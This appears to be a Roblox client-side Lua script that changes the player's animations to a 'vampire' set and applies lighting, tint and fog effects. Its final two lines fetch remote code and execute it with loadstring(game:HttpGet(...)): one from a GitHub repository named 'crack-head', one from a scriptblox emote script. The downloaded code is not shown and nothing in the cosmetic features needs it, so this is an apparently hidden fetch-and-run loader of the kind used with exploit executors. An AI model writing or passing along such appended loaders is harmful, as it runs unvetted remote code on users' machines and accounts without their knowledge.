local player = game.Players.LocalPlayer
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")

local activeEffects = {}

local function removeOldEffects()
    for _, effect in pairs(activeEffects) do
        effect:Destroy()
    end
    activeEffects = {}
end

local function activateVampireAnimation(character)
    local animate = character:WaitForChild("Animate")
    
    animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
    animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
    animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
    animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
    animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
    animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
    animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
end

local function applyDarkeningEffect()
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Name = "DarkenEffect"
    colorCorrection.Parent = Lighting

    colorCorrection.Brightness = -0.5
    colorCorrection.Contrast = 0.5
    colorCorrection.Saturation = 0.1
    colorCorrection.TintColor = Color3.fromRGB(50, 50, 50)

    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
    local tween = TweenService:Create(colorCorrection, tweenInfo, {Brightness = -0.7})
    tween:Play()

    table.insert(activeEffects, colorCorrection)

    wait(3)
end

local function applyLighteningEffect()
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.Name = "LightenEffect"
    colorCorrection.Parent = Lighting

    colorCorrection.Brightness = 0.2
    colorCorrection.Contrast = 0.5
    colorCorrection.Saturation = 1
    colorCorrection.TintColor = Color3.fromRGB(255, 255, 255)

    colorCorrection.Enabled = true

    table.insert(activeEffects, colorCorrection)
end

local function applyFogEffect()
    Lighting.FogStart = 0
    Lighting.FogEnd = 120
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
end

local function applyAllEffects()
    removeOldEffects()

    applyLighteningEffect()
    wait(1)
    
    applyDarkeningEffect()
    wait(1)
    
    applyFogEffect()
end

player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid")
    activateVampireAnimation(character)
    
    applyAllEffects()
end)

if player.Character then
    activateVampireAnimation(player.Character)
    
    applyAllEffects()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/crack-head/refs/heads/main/pk"))()

loadstring(game:HttpGet("https://scriptblox.com/raw/Brookhaven-RP-all-emotes-6849"))()
